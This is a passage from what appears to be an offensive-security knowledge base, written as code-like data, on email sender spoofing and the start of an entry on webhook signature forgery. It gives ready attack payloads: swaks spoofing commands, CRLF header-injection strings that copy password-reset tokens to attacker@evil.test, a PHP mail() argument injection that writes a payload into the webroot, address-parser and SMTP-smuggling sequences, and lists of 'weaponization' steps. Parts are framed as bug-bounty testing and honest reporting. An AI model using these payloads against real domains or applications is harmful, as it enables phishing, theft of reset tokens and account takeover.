          'The subdomain trap is where most real findings are. RFC 7489 says that if the sp= tag is absent, the policy in p= applies to subdomains as well, so a bare p=reject does cover them. Two things break that. First, an explicit sp=none on an otherwise strict record deliberately exempts every subdomain, and mail from any unused name under the domain is then unfiltered. Second, a subdomain that publishes its own _dmarc record wins over the organizational one, so a forgotten _dmarc.marketing.target.com with p=none is a hole even when the apex is p=reject. Enumerate the subdomains you already have from recon and query _dmarc on the ones that plausibly send mail, plus obviously spoofable unused ones such as billing, hr, it, payroll, and invoices.',
          'A domain with no DMARC record at all falls back to the organizational domain lookup, so a subdomain of a protected apex may still be covered. Confirm which record actually applies before writing it up.',
        ],
        examples: [
          { code: 'v=DMARC1; p=none; rua=mailto:reports@target.com', note: 'Monitoring only. The visible From is spoofable; delivery is unaffected by the failure.' },
          { code: 'v=DMARC1; p=reject; sp=none; adkim=r; aspf=r', note: 'Apex protected, every subdomain deliberately exempt. Spoof from an unused subdomain such as billing.target.com.' },
          { code: 'v=DMARC1; p=quarantine; pct=10', note: 'Ninety percent of failing mail is handled normally. Resend until it lands.' },
          { code: 'dig +short TXT _dmarc.billing.target.com   _dmarc.hr.target.com   _dmarc.it.target.com', note: 'Look for an unused-but-plausible subdomain with no record and an sp=none parent.' },
        ],
      },
      {
        heading: 'Judge DKIM: what is signed, what is not, and how strong the key is',
        body: [
          "DKIM keys live at <selector>._domainkey.<d-domain> as a TXT record containing at minimum a p= public key. Check the key length by decoding the base64 and reading the modulus size. RFC 8301, which updates RFC 6376, requires signers to use RSA keys of at least 1024 bits and recommends 2048, and requires verifiers not to treat signatures made with keys under 1024 bits as valid. A 512-bit key is factorable on commodity hardware, and a domain still publishing one can have its mail signed by anyone who does the work. RFC 8301 also forbids rsa-sha1 outright for both signing and verifying, so a DKIM-Signature carrying a=rsa-sha1 is a finding on its own.",
          'Read the h= tag on a real signature from the target. Only the headers named there are covered. If From appears once and the message already contains one From header, an attacker who can get a second From header into the message adds an identity the signature never protected, and published research on parser inconsistency between mail servers and mail clients (Chen, Paxson and Jiang, Composition Kills, USENIX Security 2020) showed that the authenticating server and the displaying client can pick different ones. RFC 6376 provides the defence: list a header field name in h= more times than it actually appears, which is called oversigning and makes any later addition of that header break the signature. A h= list without oversigned From, Subject, To, and Reply-To is worth calling out.',
          'Read the l= tag. It sets a body length in octets, and RFC 6376 is explicit that it exists so that data may be appended after the signed portion. If a target signs with l=, you can take a genuine signed message from them and append arbitrary content to the body; the signature still verifies, DMARC still aligns, and the recipient sees your text in a message the domain really signed. Most mail clients render the appended part with no distinction at all.',
          "Note who else holds a key. Third party selectors from marketing and ticketing platforms mean those vendors can produce aligned, signed mail as the target. That is intended, but it widens the trusted set, and a self service account on a shared sending platform occasionally lets you send from a domain you do not own.",
        ],
        examples: [
          { code: 'DKIM-Signature: v=1; a=rsa-sha256; d=target.com; s=selector1; h=from:to:subject:date; bh=...; b=...', note: 'Read d= for the signing domain, s= for the selector, h= for the covered headers.' },
          { code: 'dig +short TXT selector1._domainkey.target.com\nthen take the p= value and run:\necho <base64-key> | base64 -d | openssl rsa -pubin -inform DER -text -noout | head -1', note: 'Decode the published key and read the modulus size. Under 1024 bits is a real weakness; 512 bits is factorable.' },
          { code: 'h=from:from:to:subject:subject:date', note: 'Oversigned From and Subject. Adding a second one of either now invalidates the signature.' },
          { code: 'DKIM-Signature: ...; l=1024; ...', note: 'Only the first 1024 octets of the body are signed. Append your own paragraph and the signature still passes.' },
        ],
      },
      {
        heading: 'Prove it with a controlled inbox and swaks',
        body: [
          'None of the record reading is a finding until you deliver a message. Set up an inbox you control at a mailbox provider that shows full headers, then send yourself a message with the envelope sender on a domain you own and the header From on the target, and read what the receiving server decided. swaks is the right tool because it separates the two identities cleanly: -f sets the envelope MAIL FROM, and --h-From sets the header the recipient sees. --header adds or replaces a header, --add-header appends without replacing, and --data lets you supply the entire DATA block byte for byte when you need exact control.',
          'The verdict is in the Authentication-Results header the receiving server adds. Read the spf=, dkim=, and dmarc= results and, crucially, the header.from= and smtp.mailfrom= values next to them, because that is where you can see alignment succeed or fail. A message with spf=pass on your own domain and dmarc=none on the target is exactly the no-DMARC spoof, delivered. Do not stop at the raw acceptance, record which folder it landed in, because inbox versus spam is the difference between a real finding and a theoretical one.',
          'Two alternatives are useful when you do not have your own MTA. Sending to check-auth@verifier.port25.com returns an automated report of the SPF, DKIM, DMARC and SpamAssassin results, and mail-tester.com scores a message and shows the same evaluation. Both are only useful with an inbox you actually control, and neither replaces a delivery test against the receiver the real victims use.',
          'For the harder cases, espoofer (the tool released with the Composition Kills research) automates the header manipulation and DKIM manipulation variants that induce inconsistency between the authenticating server and the client, and is the right tool once simple spoofing is blocked.',
        ],
        examples: [
          { code: 'swaks --to you@yourinbox.test --from bounce@yourdomain.test --h-From "IT Support <it-support@target.com>" --header "Subject: Password reset required" --body "Test message" --server mx.yourinbox.test', note: 'The core no-DMARC test. Envelope on a domain that passes its own SPF, visible From on the target.' },
          { code: 'swaks --to you@yourinbox.test --from bounce@yourdomain.test --h-From billing@unused.target.com --server mx.yourinbox.test', note: 'The sp=none or missing-subdomain-record variant. Try several plausible unused subdomains.' },
          { code: 'swaks --server mail.target.com --to you@yourinbox.test --from anything@target.com --quit-after RCPT', note: 'Checks whether the target MTA relays or accepts mail claiming to be from itself. Stop before DATA so nothing is delivered.' },
          { code: 'swaks --to you@yourinbox.test --data @raw-message.txt --server mx.yourinbox.test', note: 'Send an exact DATA block, needed for duplicate From headers, l= append tests, and encoding tricks.' },
          { code: 'Authentication-Results: mx.example.com; spf=pass smtp.mailfrom=yourdomain.test; dkim=none; dmarc=none header.from=target.com', note: 'Read this, not the delivery status. dmarc=none on the target with the message in the inbox is the proof.' },
        ],
      },
      {
        heading: 'Spoofing that still works when DMARC is p=reject',
        body: [
          "An enforcing DMARC record closes the exact-domain spoof and nothing else. The techniques that remain are worth testing because they are what a real phishing campaign against the target would use, and because several of them are the target's own fault.",
          "The display name spoof is the most common. DMARC evaluates the address inside the angle brackets, not the free text before it, and most mail clients, especially on mobile, show only the display name. Putting a full target address in the display name of a message from a domain you own passes DMARC on your domain and reads as the target to the recipient. Some clients have added a warning for this pattern; check the ones the target's users actually run.",
          'Lookalike domains are the next step: a registrable neighbour such as target-support.com or an internationalized homograph that renders as the target in a proportional font. Configure it with its own clean SPF, DKIM and DMARC and it authenticates perfectly, because it genuinely is your domain.',
          'Reply-To manipulation matters more than it looks. Sending From an address at the target with Reply-To pointed at your own mailbox means any automatic acknowledgement, out of office reply, or ticket auto-response triggered by an internal-looking sender comes back to you, sometimes quoting internal content. This is also the payload of the header injection section below.',
          'Then look for an aligned sending path you can legitimately obtain. Every third party in the SPF chain and every DKIM selector is a place where a self service account, an unclaimed tenant, or a poorly isolated shared platform can give you the ability to send DMARC-aligned mail as the domain. That, not the DNS record, is where high severity findings live.',
        ],
        examples: [
          { code: 'From: "billing@target.com" <attacker@lookalike.test>', note: 'Display name spoof. DMARC passes on lookalike.test; the client shows the target address.' },
          { code: 'From: "Target Security Team" <no-reply@target.com>\nReply-To: attacker@evil.test', note: 'Replies and auto-acknowledgements go to the attacker even when the From is the target.' },
          { code: 'From: support@tarqet.com   or an IDN such as   xn--80ak6aa92e.com   which renders as apple.com', note: 'Its own domain, its own passing DMARC. Nothing in the mail path flags it; the second is the 2017 Xudong Zheng homograph demo.' },
        ],
      },
      {
        heading: 'Application side: mail header injection through a name, subject, or address field',
        body: [
          "This is the half that lives in the target's code. Any user supplied value that ends up in the header block of an outgoing message is an injection point if a carriage return and line feed survive it, because CRLF is what separates one header from the next. Get a newline through and you author your own headers in a message the target sends and signs.",
          'Where to look: the name field on a contact form, the subject on a support request, a display name in a profile that is used in notification mail, an invitation message, a shared cart or wish list, a document share, the reply address on a newsletter signup, a filename on an upload notification, and the address field of any double opt in. Test the plain characters first, then percent encoded, then the variants filters miss.',
          'The three payloads that matter are a Bcc that silently copies you on everything the flow sends, a Reply-To or From that changes who the recipient answers, and a double newline that terminates the header block early so the rest of your input becomes the message body. The Bcc case is the highest value: if the injectable field is on a password reset or invoice flow, you receive a copy of every message including the reset token.',
          "Modern mail libraries mostly strip bare newlines from header values, so the naive payload often fails. That is not the end of the test. Try the encoded variants, the Unicode line separators, and any field that is written into a raw header string by hand rather than through the library API. PHP applications that call mail() are the classic case, and its fifth argument is a separate and worse problem: $additional_parameters is appended to the sendmail command line and only passed through escapeshellcmd, which blocks shell metacharacters but does not stop you adding more arguments. Sendmail's -X option writes a full traffic log to a path you choose, so a controllable fifth argument plus a controllable subject or body writes a PHP payload into the webroot. The abusable options differ per MTA, and Postfix's sendmail compatibility binary does not implement -X, so confirm which MTA is installed before claiming RCE.",
        ],
        examples: [
          { code: 'name=Legit%0d%0aBcc:attacker@evil.test', note: 'Silently copies the outgoing message, including any reset or invite token, to the attacker.' },
          { code: 'email=user@target.com%0aCc:one@evil.test,%0aBcc:two@evil.test', note: 'Bare LF variant. Many parsers accept LF alone as a header terminator.' },
          { code: 'from=sender@target.com%0aSubject:Your account has been suspended', note: 'Injected Subject is prepended to or replaces the real one depending on the mail service.' },
          { code: 'name=Legit%0d%0a%0d%0aClick https://evil.test to restore access.', note: 'Double CRLF ends the header block; everything after it becomes attacker authored body text in a signed message.' },
          { code: 'name=Legit%0d%0aReply-To:attacker@evil.test', note: 'Recipient replies to the attacker while the mail still shows the brand as sender.' },
          { code: 'Encoding variants when CRLF is filtered:  %0D  %0A  %0D%0A  %E5%98%8A (LF)  %E5%98%8D (CR)  %E2%80%A8 (U+2028)  %C2%85 (U+0085)', note: 'The same bypass set used for CRLF response splitting; try each against the header sink.' },
          { code: 'PHP:  mail($to,$subject,$msg,$headers, "-X/var/www/html/x.php")  with a PHP tag in the subject', note: 'Fifth argument injection. escapeshellcmd permits extra arguments; -X logs the message to a web reachable path. Sendmail and Exim only.' },
        ],
      },
      {
        heading: "Application side: make the brand's own mailer send your text",
        body: [
          "The most reliable way to send mail from a target domain is not to spoof it. It is to find a feature that sends attacker authored content on a user's behalf, because that mail is genuinely originated by the target's infrastructure, passes SPF, carries a valid DKIM signature, aligns under DMARC, and has perfect deliverability and brand reputation behind it.",
          'Hunt for these systematically: invite a colleague, share this article, send this document, email me this cart, refer a friend, report a problem with an auto-reply, gift card and e-card messages, calendar invitations, an appointment reminder with a free text note, and the customer message field on any marketplace order. For each, check three things: how much of the message body you control, whether you control the recipient address, and whether you can control the recipient list length.',
          "The finding is graded by how much attacker text reaches the recipient and how little of the surrounding template makes it obviously automated. A share feature that lets you write a paragraph and pick an arbitrary recipient is a phishing service running on the target's domain, and it beats a missing DMARC record by a wide margin. Include a link to attacker infrastructure in the free text to show the message is not just noise, and screenshot how it renders in a normal mail client.",
          "Check the recipient controls while you are there. A share endpoint that accepts a list of addresses with no cap, or that can be called repeatedly without rate limiting, is both a mail bomb against a chosen victim and a way to burn the target's sender reputation. Services with a hard bounce threshold, such as AWS SES at around ten percent, will suspend the sending account when enough invalid addresses are pushed through it.",
        ],
        examples: [
          { code: 'POST /api/share  {"to":"victim@bank.example","message":"Your invoice is attached: https://evil.test/inv"}', note: 'Attacker text, attacker recipient, delivered from the brand domain and DKIM signed. This is the high value version of the bug.' },
          { code: 'POST /api/invite  {"emails":["a@x.test", ... 500 more], "note":"<attacker text>"}', note: 'Test whether the recipient list is capped and whether the endpoint is rate limited.' },
          { code: 'Set your profile display name to a full sentence, then trigger a notification mail.', note: 'A stored value that reaches the mail template is the persistent version of the same abuse.' },
        ],
      },
      {
        heading: 'Email address parser discrepancies: verification mail that lands elsewhere',
        body: [
          "An address that one component validates as belonging to the target's domain but that a different component delivers to an attacker mailbox is a direct route to holding a trusted identity. Gareth Heyes documented this at PortSwigger under the title Splitting the Email Atom, and the Web Security Academy lab named Bypassing access controls using email address parsing discrepancies is the cleanest place to practise it.",
          'Three families of trick do the work. RFC 2047 encoded-word syntax lets you encode characters that the validating layer never sees decoded but the mail transport does, so an encoded @ and > can split the address apart in the SMTP RCPT TO and route the verification message to a different mailbox entirely. Unicode overflow abuses parsers that reduce a codepoint modulo 256, so a high codepoint character becomes an ASCII @ after the check that rejected literal @ characters. Malformed punycode decodes into characters, including a second @, that the validator never saw.',
          'Also test the mundane variants first, because they are common and cheap: a plus tag or a dot that some services normalize away, comments in parentheses which RFC 5322 permits, quoted local parts, and IP literal domains in square brackets. Any of these that makes the application treat two different addresses as the same one, or the same address as two different ones, is worth chasing.',
          'The impact to aim for is an account that the application believes holds an address at a privileged domain, since many products grant automatic team membership, an internal role, or SSO domain trust on that basis. That is where this crosses into the Authentication Bypass entry, and it goes further than that entry does: the credential check is never bypassed, the application correctly verifies an address it should never have accepted.',
        ],
        examples: [
          { code: '=?x?q?collab=40psres.net=3e=00?=foo@example.com', note: 'Encoded-word with an encoded @ (=40) and > (=3e). Validated as one domain, delivered to another. Reported against GitHub.' },
          { code: '=?x?q?collab=40psres.net_?=foo@example.com', note: 'Underscore acts as a space in q-encoding, separating the addresses. Reported against GitLab.' },
          { code: '=?x?q?=41=42=43collab=40psres.net=3e=20?=@psres.net    ->   RCPT TO:<"ABCcollab@psres.net> "@psres.net>', note: 'The one payload in this family with a published SMTP conversation next to it in the Splitting the Email Atom paper. Start here, because you can check your result against a known good transcript.' },
          { code: 'Zendesk variant: doubled encoded quotes (=22) plus =3c to generate a less-than that their code strips, which completes the quote and passes validation.', note: 'Mechanism only. The exact byte sequence is in the Splitting the Email Atom paper; construct it against your own Collaborator rather than pasting a string from a cheat sheet, because a malformed q-encoded run (== followed by a hex pair) will not decode at all.' },
          { code: 'foo@xn--0117.example.com   decoding to   foo@@.example.com', note: 'Malformed punycode producing a second @ after validation.' },
          { code: 'john.doe+tag@target.com   john.doe(comment)@target.com   john.doe@[127.0.0.1]', note: 'Cheap normalization and syntax tests to run before the exotic ones.' },
        ],
      },
      {
        heading: 'SMTP smuggling: two servers disagreeing about where the message ends',
        body: [
          "SMTP smuggling, published by SEC Consult in December 2023, is the mail equivalent of HTTP request smuggling. RFC 5321 says message data ends with the exact sequence <CR><LF>.<CR><LF>. Some outbound servers forwarded non standard variants unchanged while some inbound servers accepted those variants as a terminator, so an attacker sending one legitimate message through an outbound relay could end the data early from the inbound server's point of view and have the remaining bytes parsed as a second, entirely attacker written SMTP transaction.",
          "The reason this is a spoofing bug rather than a curiosity is that the smuggled second message arrives on the outbound relay's connection and from the relay's IP. It inherits the relay's SPF authorization, so a message claiming any From at a domain that authorizes that relay passes authentication. SEC Consult demonstrated sending as arbitrary addresses at domains hosted by GMX and Ionos, through Microsoft Exchange Online, and against Cisco Secure Email Gateway, whose default Clean setting normalized bare CR and LF into CRLF on inbound and thereby created the terminator.",
          'The prerequisites are narrow and worth stating honestly. You need an outbound path you can send through that forwards the malformed sequence unchanged, an inbound server that accepts it as end of data, and a DATA based transaction, since BDAT and CHUNKING sidestep the whole issue. PIPELINING helps hide the injection.',
          'Most of this was fixed. Sendmail through 8.17.2 was CVE-2023-51765 and tightened in 8.18.1, where the srv_features o flag is on by default so you can verify a self built binary rather than trusting a version string, Exim before 4.97.1 was CVE-2023-51766, and Postfix was CVE-2023-51764 and now ships smtpd_forbid_bare_newline=normalize by default from 3.9 onward, having defaulted to no in earlier releases with the fix backported to 3.8.5, 3.7.10, 3.6.14 and 3.5.24. Note that Postfix excludes clients in mynetworks from the countermeasure by default. Cisco declined to treat its behaviour as a vulnerability and pointed customers at changing the setting from Clean to Allow. Treat smuggling as a check to run against a self hosted or appliance mail path rather than an assumption, and expect major cloud providers to be patched.',
        ],
        examples: [
          { code: 'Standard terminator:  <CR><LF> . <CR><LF>', note: 'The only sequence RFC 5321 defines as end of data.' },
          { code: 'Variants to test:  <LF>.<LF>   <LF>.<CR><LF>   <CR>.<CR>   <CR><LF>.<CR>   <CR><LF><NUL>.<CR><LF>', note: 'One of these being forwarded by the sender and honoured by the receiver is the desync.' },
          { code: 'MAIL FROM:<you@yours.test> / RCPT TO:<victim@target.com> / DATA / <body> / <LF>.<CR><LF> / MAIL FROM:<ceo@target.com> / RCPT TO:<victim@target.com> / DATA / spoofed message / <CR><LF>.<CR><LF>', note: 'The second transaction is delivered on the relay connection and inherits its SPF pass.' },
          { code: 'postconf smtpd_forbid_bare_newline    (expect: normalize on 3.9+, no on older builds)', note: 'The Postfix inbound side check. reject is the strictest value; yes is an alias for normalize.' },
          { code: 'Tools: hannob/smtpsmug for receiver behaviour, The-Login/SMTP-Smuggling-Tools for sender and receiver pairing.', note: 'Both test whether a given hop honours the malformed terminators.' },
        ],
      },
      {
        heading: 'Tools, workflow, and writing the impact honestly',
        body: [
          'A working order that avoids wasted effort: pull the records with dig, run checkdmarc or mailspoof for a fast structured read of SPF and DMARC problems, expand the SPF include chain by hand and check every name for a lapsed registration, then prove the spoof by delivering a message to an inbox you control with swaks and reading the Authentication-Results header. Only after that, move to the application: enumerate every feature that sends mail, test each free text field for CRLF, and test each address field for parser discrepancies.',
          "Now the part that decides whether the report is accepted. Missing or permissive DMARC on its own is routinely closed as informational, and many programs list it as explicitly out of scope, because a DNS record is not by itself a demonstration that anyone can be harmed. Do not write it up as a critical. Write up what you actually did: a delivered message, in the inbox rather than spam, at a recipient in the target's user population or a realistic stand in, with a screenshot of how the client renders the sender.",
          'Severity comes from the sending path, not the record. In rough order: a feature that sends attacker authored text with an attacker chosen recipient from the brand domain is high, because it is genuine signed mail with no forgery to detect. A Bcc injection on a password reset or invoice flow is high, because it exfiltrates secrets. A rerouted verification email that yields an account trusted as an internal address is high, because it converts to access. An unenforcing DMARC record on a domain that demonstrably sends transactional mail to customers is medium, and the argument is the delivered proof plus the existing customer relationship that makes the pretext credible. An unenforcing record on a domain that sends no mail and has no users is low or informational, and saying so yourself is what makes the rest of the report credible.',
          'One more honesty check before submitting: confirm which record actually applied. A subdomain with no DMARC record inherits the organizational domain policy, so a spoof that only worked because you tested a name outside the organizational domain is not a finding against the target.',
        ],
        examples: [
          { code: 'pip install checkdmarc  &&  checkdmarc target.com', note: 'Structured SPF and DMARC parse including include-chain expansion and lookup counting.' },
          { code: 'mailspoof -d target.com', note: 'Flags permissive qualifiers, missing records, and weak policies quickly across a domain list.' },
          { code: 'swaks --to you@yourinbox.test --from probe@yours.test --h-From ceo@target.com --server mx.yourinbox.test --header "Subject: PoC"', note: 'The delivery proof. Save the full raw headers of what arrives, not just a screenshot of the record.' },
          { code: 'python3 espoofer.py -l    then    python3 espoofer.py -id server_a1     (modes are -m s, -m c, -m m for server, client, and manual)', note: 'Runs the header and DKIM manipulation cases from the Composition Kills research when simple spoofing is blocked. The victim address, sender, and server are set in config.py, not on the command line.' },
        ],
      },
    ],
    stride: {
      spoofing: {
        weaponization: [
          'Send mail with the visible From set to any address at the target domain when no DMARC record exists, because SPF authenticates only the envelope MAIL FROM and DKIM only the signing domain, so nothing ever checked the address the recipient reads.',
          'Deliver the same forgery against a domain publishing p=none, or slip through the unenforced remainder of a record using pct= below 100.',
          'Spoof an unused subdomain such as billing or hr where an explicit sp=none exempts subdomains from a strict parent policy, or where a forgotten _dmarc record on a sending subdomain sets p=none under a p=reject apex.',
          "Register a lapsed domain still named in the target's SPF include, redirect, a, or mx chain, or claim an unclaimed service behind a CNAMEd subdomain in that chain, then authorize your own sending IPs as the target; this is the SubdoMailing pattern against MSN, VMware, McAfee, and eBay subdomains.",
          'Inflate or exploit an SPF chain that already exceeds the ten DNS lookup limit so evaluation returns permerror, removing any SPF-based alignment and leaving unauthorized senders unjudged.',
          'Put a full target address in the From display name so DMARC passes on an attacker owned domain while the mail client, especially on mobile, shows only the target address.',
          'Register a homograph or near-miss domain and give it its own clean SPF, DKIM and DMARC, producing a fully authenticated sender that is not the target but reads as it.',
          'Abuse DKIM signing weaknesses to sign as the domain: append attacker text past the l= body length boundary of a genuine signed message so the signature still verifies, add a second From header where h= did not oversign From so the verifier and the client read different identities, or factor a published RSA key under 1024 bits and sign your own messages.',
          "Inject CRLF into a name, subject, or address field so your own From, Sender, or Reply-To header is written into a message that the target's MTA sends and the target's DKIM key signs, making the forgery genuine rather than spoofed.",
          "Use the target's own send-on-behalf feature (invite, share this document, email me this cart, contact form auto-reply) so attacker authored text is delivered from the brand address with a valid signature and perfect alignment, with nothing to detect.",
          "Smuggle a second SMTP transaction past a relay that forwards a non standard end-of-data sequence, so a fully attacker written message arrives on the relay connection and inherits the relay's SPF authorization for the target domain.",
          'Reroute a verification or password reset message through an email address parser discrepancy so the application confirms and thereafter believes you hold an address at the target domain.',
          'Set Reply-To to an attacker mailbox on a message that appears internal, so automated replies and human responses that would have gone to a real employee address come to the attacker instead.',
        ],
        why: "The identity a recipient acts on is the RFC 5322 From header, but SPF authenticates the SMTP envelope sender and DKIM authenticates only a signing domain over a chosen list of headers, so unless DMARC is published and enforcing to bind one of those results to the From domain, no component in the mail path ever checks the name the human reads; and where the attacker can inject into or invoke the target's own mail sender, no forgery is needed at all, because the message is composed, sent, and cryptographically signed by the domain it claims to come from.",
      },
      tampering: {
        weaponization: [
          'Rewrite the recipient set of a message the application intended to send by injecting Cc or Bcc headers through an unsanitized name, subject, or address field.',
          'Replace or prepend the Subject of a transactional message so the content users receive is not what the application composed.',
          'Terminate the header block early with a double CRLF so the rest of the injected value becomes the message body, replacing the template text inside a message the target signs.',
          'Append arbitrary content to a genuine DKIM-signed message past the l= body length boundary, changing what the recipient reads while the signature continues to verify.',
          'Add or duplicate headers that the h= list failed to oversign, altering the identity or routing metadata of a message without breaking its signature.',
          'Inject a second SMTP transaction through a smuggling desync so the receiving server stores a message the sending relay never composed.',
          'Inject extra sendmail arguments through the PHP mail() fifth parameter, writing attacker chosen content to an attacker chosen path on the application host.',
        ],
        why: 'Header blocks and the SMTP DATA stream are line delimited structures assembled from application data, so a value that carries a line terminator stops being data and becomes structure, letting the attacker rewrite the message, its recipients, and its body after the application has already decided what to send and, where signing covers less than the whole message, without invalidating the proof of authorship.',
      },
      information_disclosure: {
        weaponization: [
          'Inject a Bcc into a transactional mail flow so every message it sends, including password reset links, one-time codes, invoices, and invitation tokens, is silently copied to an attacker mailbox.',
          'Inject Reply-To on a message that appears to come from an internal address so automatic acknowledgements and out-of-office replies, which frequently quote internal content, are delivered to the attacker.',
          'Reroute a verification or reset message with an address parser discrepancy so the secret token the application generated for a target-domain address arrives in an attacker inbox.',
          'Use the PHP mail() fifth parameter to make the MTA write a traffic log containing full message bodies to a path the attacker can read over the web.',
          'Read the DMARC rua and ruf addresses, the SPF include chain, and the published DKIM selectors to map exactly which third party platforms are trusted to send as the domain, which is reconnaissance for the aligned-sending-path attack.',
        ],
        why: "Transactional mail is the delivery channel for the application's most sensitive one-time material, so any control over the recipient headers of that mail, or over which mailbox a verification message is ultimately routed to, hands the attacker secrets the application deliberately sent out of band.",
      },
      elevation_of_privilege: {
        weaponization: [
          'Register an address that a validator reads as belonging to a privileged domain but that the mail transport delivers to the attacker, then complete verification and receive whatever membership, internal role, or automatic team join the product grants on the basis of that domain.',
          'Intercept an administrator password reset through an injected Bcc on the reset flow and use the token to take the account.',
          'Chain a spoofed internal-looking message into an approval or support workflow that grants access on the strength of a request appearing to come from an employee address.',
        ],
        why: 'Many applications treat demonstrated control of an address at a domain as proof of organizational membership, so an address that satisfies the domain check while delivering elsewhere, or a reset token diverted from a privileged account, converts an outsider into a trusted internal principal without ever defeating the credential check itself.',
      },
      repudiation: {
        weaponization: [
          'Exploit a DMARC record with no rua or ruf address, or no DMARC record at all, so the domain owner receives no aggregate or failure reports and holds no evidence that the forgery ever happened.',
          "Use the target's own sending feature so the outbound mail log records a normal, legitimate, authenticated send that is indistinguishable from every other message that flow produces.",
          'Smuggle the message through a trusted relay so the receiving server logs it as arriving from that relay IP with a passing SPF result, pointing any forensic reconstruction at the relay operator.',
        ],
        why: "Mail carries no proof of authorship unless DKIM signs the visible identity and DMARC enforces alignment, so a forged, relayed, or feature-originated message is recorded under the target's name on both sides of the exchange and, where no reporting address is published, is never counted at all, leaving the real sender absent from every record either party keeps.",
      },
      denial_of_service: {
        weaponization: [
          'Drive a high volume of mail to invalid addresses through an injectable or uncapped sending feature so the provider hard bounce threshold is crossed, which at services such as AWS SES sits around ten percent and results in the sending account being suspended.',
          "Pump spam through a hijacked SPF-authorized sending path or the target's own mailer until the domain and its sending IPs are listed by reputation services, after which the target's legitimate transactional and marketing mail stops being delivered.",
          'Use an unrate-limited share, invite, or send-me-a-link endpoint to direct high volume mail at a chosen victim address from a trusted, well delivered domain that their filters will not block.',
        ],
        why: "Email delivery depends on a reputation asset the target does not control and cannot quickly rebuild, so an attacker who can push volume or invalid recipients through the domain's authorized sending path destroys the ability to deliver mail at all, which no amount of application capacity can restore.",
      },
    },
  },

  {
    id: 'webhook-signature-forgery',
    name: 'Webhook and API Signature Forgery',
    summary: 'Get a receiving application to accept a request as coming from a trusted sender by defeating, replaying, or side-stepping the signature that is supposed to prove the sender.',
    tags: ['authentication', 'api', 'integration'],
    executionContext: {
      where: "In the receiving application's signature verification routine, on the receiver's host, before the event handler acts on the payload.",
      detail: "Nothing of the attacker's runs on the sender's infrastructure and nothing runs in a browser. The attacker sends an ordinary HTTP request from anywhere on the internet; what executes is the receiver's own verification code, in the receiver's process, and then the receiver's business handler running with whatever authority that handler has: marking invoices paid, provisioning accounts, writing rows, calling internal services. The important split is that the cryptography can be flawless while the decision is wrong, because the verification result is the only thing separating an internet stranger from a trusted integration. Webhook routes make that worse by design: they are unauthenticated public endpoints, usually exempted from CSRF protection and often mounted outside the normal auth middleware, so the signature is frequently the only authentication on the route. One more place the effect lands is in front of the app: a body rewriting reverse proxy, WAF, or API gateway sits between sender and receiver, so the bytes the application verifies may not be the bytes the sender signed, and the mismatch is what usually pushes a team into disabling the check.",
    },
    howTo: [
      {
        heading: 'Root cause: what a signature actually proves',
        body: [
          'A webhook signature is a message authentication code computed by the sender over some byte string, using a secret both sides hold. Verification is meant to prove three things at once: that the sender holds the secret, that the bytes were not altered in flight, and that this particular delivery is fresh and intended for this endpoint. Almost every real bug is a case where the implementation proves only the first, or none of them.',
          'The failure is nearly always in the receiver, not the algorithm. HMAC-SHA256 is not broken. What breaks is: verification that is skipped when the header is missing, a comparison that is not exact, a signature computed over a re-serialised copy of the body instead of the raw bytes, a signed payload that omits the timestamp and the path so the same bytes stay valid forever and everywhere, or a secret that was never secret. Test the implementation, not the primitive.',
          'Bear the second question in mind throughout: a valid signature proves who sent it, never what they are allowed to say. If one signing key covers every tenant of a multi-tenant integration, then the tenant, account, or shop identifier inside the payload is still just a field, and the receiver has to authorize it separately (see the IDOR entry).',
        ],
      },
      {
        heading: 'Where to look',
        body: [
          'Find the receiving routes first. Grep source, route tables, and reverse proxy config for path segments such as /webhook, /webhooks, /hooks, /callback, /callbacks, /notify, /notification, /events, /ipn, /postback, /integrations, and provider names such as /stripe, /github, /slack, /shopify, /twilio, /sendgrid, /sns, /paddle, /clerk, /svix. In a JavaScript bundle or an OpenAPI document these routes are frequently listed even when they are undocumented.',
          'Then find the signed API surface that is not a webhook. The same pattern shows up on internal service-to-service calls, mobile app to backend APIs with a shared app secret, licence and activation checks, partner and reseller APIs, and payment gateway return URLs. Anything with a parameter called sig, signature, hash, checksum, hmac, token, verify, or _sig, or a header named X-Signature, X-Hub-Signature-256, X-Signature-Ed25519, or X-Something-Hmac, is in scope.',
          'Providers hand you genuine captures for free. GitHub repository and app settings keep Recent Deliveries with the full request headers and body plus a Redeliver button. Stripe Workbench keeps Event deliveries with Resend, and the CLI can resend for up to 30 days. Use those to obtain a real, correctly signed request before you start mutating it, because half the tests below need one valid pair to work from.',
          'Look for the second and third copies of the same endpoint. Staging, a legacy path kept for an old provider API version, a regional deployment, and a partner sandbox commonly share one signing secret with production, and the weakest of them decides the security of the strongest.',
        ],
        examples: [
          { code: 'rg -n "webhook|/hooks|X-Hub-Signature|Stripe-Signature|X-Slack-Signature|Hmac" --glob "!node_modules"', note: 'First pass over a codebase to find every receiver and every verification helper.' },
          { code: 'gh api repos/OWNER/REPO/hooks/HOOK_ID/deliveries', note: 'Pull real signed deliveries, headers included, when you control or are testing a GitHub integration.' },
          { code: 'stripe listen --forward-to localhost:4242/webhook   then   stripe trigger payment_intent.succeeded', note: 'Generate genuine signed traffic against your own listener so you can study the exact bytes and header format.' },
        ],
      },
      {
        heading: 'Step one: is verification enforced at all',
        body: [
          'Before any crypto, establish whether the check runs. The single most productive test in this whole entry is sending the request with no signature header, because a very common shape is a conditional that verifies when the header is present and silently proceeds when it is not, or that verifies only when a configuration value is set and the value is unset in that environment.',
          'Work through the ladder: no header, empty header value, header with a syntactically valid but wrong signature, header with garbage, header with the right prefix and a wrong digest, and the correct header with one byte of the body changed. Each rung tells you something different. Accepting an absent header means no verification. Accepting garbage but rejecting a wrong-but-well-formed digest means the parser throws and the exception is swallowed somewhere that continues. Accepting a modified body with the original signature means the signature is read and never actually compared.',
          'Watch what the response actually distinguishes. Many receivers return 200 to everything on purpose so the provider stops retrying, which means the status code tells you nothing. Judge by side effects instead: did the record change, did an email go out, did a queue job appear, did a log line get written. If you have no visibility, put a unique identifier in the payload and look for it wherever the receiver surfaces data.',
          'This is not theoretical. In n8n, the StripeTrigger node stored the Stripe webhook signing secret at setup and then never verified the Stripe-Signature header or the body at all, checking only that the event type matched, so anyone who knew the webhook URL could fire arbitrary Stripe events into a workflow (CVE-2026-21894, fixed in 2.2.2). Do not read that as one bad node in an otherwise careful product: n8n has a separate published advisory for webhook forgery through missing HMAC-SHA256 verification in its GitHub trigger. Two triggers in one product with the same class of hole is the point, because verification is per-integration code, so it is inconsistent within a single application and every trigger has to be tested on its own.',
        ],
        examples: [
